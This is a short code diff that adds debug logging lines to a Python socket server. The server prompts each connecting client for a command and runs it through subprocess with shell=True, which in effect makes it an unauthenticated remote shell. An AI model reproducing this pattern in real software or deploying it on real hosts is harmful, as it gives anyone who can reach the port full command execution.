@@ -16,11 +16,15 @@ try:
     while True:
         connexion, client_address = s.accept()
         print ("connexion from :" +str(client_address))
+        logging.error('here1')
         
         #while there is a connection, ask to receive a cmd and reply accordingly
         while True:
+            logging.error('here2')
             connexion.send(bytes("\nEnter cmd : ", "utf-8"))
+            logging.error('here3')
             cmd = connexion.recv(8192).decode()
+            logging.error('here4')
             # p = subprocess.Popen(cmd.split(" "),shell=True
             p = subprocess.Popen(cmd,shell=True
                 ,stdout=subprocess.PIPE,stderr = subprocess.PIPE)
